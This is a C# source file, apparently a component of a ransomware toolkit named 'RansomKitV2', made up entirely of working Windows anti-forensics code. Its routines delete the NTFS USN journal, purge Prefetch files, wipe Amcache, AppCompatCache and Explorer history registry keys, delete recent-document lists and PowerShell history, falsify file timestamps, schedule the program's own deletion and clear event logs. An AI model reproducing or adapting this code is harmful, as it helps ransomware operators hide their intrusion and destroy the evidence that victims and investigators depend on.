using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;

namespace RansomKitV2 // Changed from Reborn
{
    public static class AntiForensics
    {
        private const uint FSCTL_DELETE_USN_JOURNAL = 0x000900F4;
        private const uint GENERIC_READ_WRITE = 0xC0000000;
        private const uint FILE_SHARE_RW = 0x00000003;
        private const uint OPEN_EXISTING_V = 3;
        private static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateFileW(string lpFileName, uint dwDesiredAccess,
            uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition,
            uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode,
            IntPtr lpInBuffer, uint nInBufferSize, IntPtr lpOutBuffer, uint nOutBufferSize,
            out uint lpBytesReturned, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetFileInformationByHandle(IntPtr hFile, int FileInformationClass,
            IntPtr lpFileInformation, uint dwBufferSize);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool MoveFileExW(string lpExistingFileName,
            string lpNewFileName, uint dwFlags);

        [StructLayout(LayoutKind.Sequential)]
        private struct DELETE_USN_JOURNAL_DATA
        {
            public ulong UsnJournalID;
            public uint DeleteFlags;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct FILE_BASIC_INFO
        {
            public long CreationTime;
            public long LastAccessTime;
            public long LastWriteTime;
            public long ChangeTime;
            public uint FileAttributes;
        }

        private const uint USN_DELETE_FLAG_DELETE = 0x00000001;
        private const uint FILE_WRITE_ATTRIBUTES = 0x0100;
        private const uint FILE_SHARE_ALL = 0x00000007;
        private const int FileBasicInfo = 0;
        private const uint MOVEFILE_DELAY_UNTIL_REBOOT = 0x4;

        public static bool WipeUsnJournal(char driveLetter = 'C')
        {
            try
            {
                string vol = @"\\.\" + char.ToUpper(driveLetter) + ":";
                IntPtr h = CreateFileW(vol, GENERIC_READ_WRITE, FILE_SHARE_RW, IntPtr.Zero, OPEN_EXISTING_V, 0, IntPtr.Zero);
                if (h == INVALID_HANDLE_VALUE || h == IntPtr.Zero) return false;

                var dj = new DELETE_USN_JOURNAL_DATA
                {
                    UsnJournalID = 0,
                    DeleteFlags = USN_DELETE_FLAG_DELETE
                };

                int size = Marshal.SizeOf(dj);
                IntPtr buf = Marshal.AllocHGlobal(size);
                try
                {
                    Marshal.StructureToPtr(dj, buf, false);
                    bool ok = DeviceIoControl(h, FSCTL_DELETE_USN_JOURNAL, buf, (uint)size, IntPtr.Zero, 0, out _, IntPtr.Zero);
                    return ok;
                }
                finally { Marshal.FreeHGlobal(buf); CloseHandle(h); }
            }
            catch { return false; }
        }

        public static void CleanPrefetch(string exeName)
        {
            try
            {
                if (string.IsNullOrEmpty(exeName)) return;
                string pfDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Prefetch");
                if (!Directory.Exists(pfDir)) return;

                string stem = Path.GetFileNameWithoutExtension(exeName).ToUpperInvariant();
                foreach (var f in Directory.GetFiles(pfDir, stem + "*.pf"))
                    try { File.Delete(f); } catch { }

                string rb = Path.Combine(pfDir, "ReadyBoot");
                if (Directory.Exists(rb))
                {
                    foreach (var f in Directory.GetFiles(rb, "*.fx"))
                        try { File.Delete(f); } catch { }
                }
            }
            catch { }
        }

        public static void CleanAmcache()
        {
            try
            {
                string[] keys = {
                    @"SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache",
                    @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Amcache"
                };
                foreach (var k in keys)
                {
                    try
                    {
                        using (var key = Registry.LocalMachine.OpenSubKey(k, true))
                        {
                            if (key == null) continue;
                            foreach (var sub in key.GetSubKeyNames())
                                try { key.DeleteSubKeyTree(sub, false); } catch { }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        public static void CleanExplorerArtifacts()
        {
            CleanRegistryTree(@"Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist");
            CleanRegistryTree(@"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU");
            CleanRegistryTree(@"Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths");
            CleanRegistryTree(@"Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs");
            CleanRegistryTree(@"Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU");
            CleanRegistryTree(@"Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU");
            CleanRegistryTree(@"Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache");
            CleanRegistryTree(@"Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU");
            CleanRegistryTree(@"Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags");
        }

        private static void CleanRegistryTree(string subKey)
        {
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(subKey, true))
                {
                    if (key == null) return;
                    foreach (var name in key.GetValueNames())
                        try { key.DeleteValue(name, false); } catch { }
                    foreach (var sub in key.GetSubKeyNames())
                        try { key.DeleteSubKeyTree(sub, false); } catch { }
                }
            }
            catch { }
        }

        public static void CleanRecentDocs()
        {
            try
            {
                string recent = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Recent");
                if (!Directory.Exists(recent)) return;

                foreach (var f in Directory.GetFiles(recent))
                    try { File.Delete(f); } catch { }

                foreach (var sub in new[] { "AutomaticDestinations", "CustomDestinations" })
                {
                    string p = Path.Combine(recent, sub);
                    if (!Directory.Exists(p)) continue;
                    foreach (var f in Directory.GetFiles(p))
                        try { File.Delete(f); } catch { }
                }
            }
            catch { }
        }

        public static void CleanPowershellHistory()
        {
            try
            {
                string ps = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt");
                if (File.Exists(ps))
                {
                    try { File.SetAttributes(ps, FileAttributes.Normal); } catch { }
                    try { File.Delete(ps); } catch { }
                }
            }
            catch { }
        }

        public static void ScheduleSelfDelete()
        {
            try
            {
                string self = Process.GetCurrentProcess().MainModule?.FileName;
                if (string.IsNullOrEmpty(self)) return;
                MoveFileExW(self, null, MOVEFILE_DELAY_UNTIL_REBOOT);
            }
            catch { }
        }

        public static void Timestomp(string path, DateTime when)
        {
            try
            {
                if (!File.Exists(path)) return;
                IntPtr h = CreateFileW(path, FILE_WRITE_ATTRIBUTES, FILE_SHARE_ALL, IntPtr.Zero, OPEN_EXISTING_V, 0, IntPtr.Zero);
                if (h == INVALID_HANDLE_VALUE || h == IntPtr.Zero) return;

                long ft = when.ToFileTimeUtc();
                var bi = new FILE_BASIC_INFO
                {
                    CreationTime = ft,
                    LastAccessTime = ft,
                    LastWriteTime = ft,
                    ChangeTime = ft,
                    FileAttributes = 0
                };

                int size = Marshal.SizeOf(bi);
                IntPtr buf = Marshal.AllocHGlobal(size);
                try
                {
                    Marshal.StructureToPtr(bi, buf, false);
                    SetFileInformationByHandle(h, FileBasicInfo, buf, (uint)size);
                }
                finally { Marshal.FreeHGlobal(buf); CloseHandle(h); }
            }
            catch { }
        }

        public static void FullSweep(string exeName)
        {
            WipeUsnJournal('C');
            CleanPrefetch(exeName);
            CleanAmcache();
            CleanExplorerArtifacts();
            CleanRecentDocs();
            CleanPowershellHistory();
        }

        public static void ClearEventLog(string logName)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "wevtutil.exe",
                    Arguments = $"cl {logName}",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                using (var p = Process.Start(psi))
                    p.WaitForExit(3000);
            }
            catch { }
        }
    }
}